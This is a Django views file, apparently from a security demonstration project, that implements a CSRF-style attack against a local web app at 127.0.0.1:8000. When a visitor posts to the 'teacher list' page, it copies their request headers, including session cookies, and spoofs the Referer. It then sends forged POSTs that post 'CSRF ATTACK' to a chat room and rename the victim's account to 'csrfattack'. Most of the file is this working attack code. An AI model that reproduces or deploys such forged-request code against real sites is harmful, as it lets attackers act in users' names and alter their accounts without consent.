from django.shortcuts import render, redirect
from django.views.generic import TemplateView

import requests


def teacher_list(request):
    template_name = "csrf_attack/teacher_list.html"
    # 攻撃先URLの指定
    url1 = "http://127.0.0.1:8000/talkroom/1/"
    url2 = "http://127.0.0.1:8000/accounts/user/update/" + str(request.user.pk) + "/"
    # 送信元URLの指定
    referer1 = "http://127.0.0.1:8000/talkroom-list/"
    referer2 = "http://127.0.0.1:8000/mypage/"
    # ヘッダーの送信元URL情報の偽装
    headers1 = dict(request.headers)
    headers1["Referer"] = referer1
    headers2 = dict(request.headers)
    headers2["Referer"] = referer2
    # 送信する情報の指定
    params1 = {
        "content": "CSRF ATTACK",
    }
    params2 = {
        "username": "csrfattack",
    }

    if request.method == "POST":
        response1 = requests.post(
            url=url1,
            headers=headers1,
            data=params1,
        )
        response2 = requests.post(
            url=url2,
            headers=headers2,
            data=params2,
        )
        return redirect("attack:teacher")

    else:
        return render(request, template_name)


class TeacherView(TemplateView):
    template_name = "csrf_attack/teacher.html"
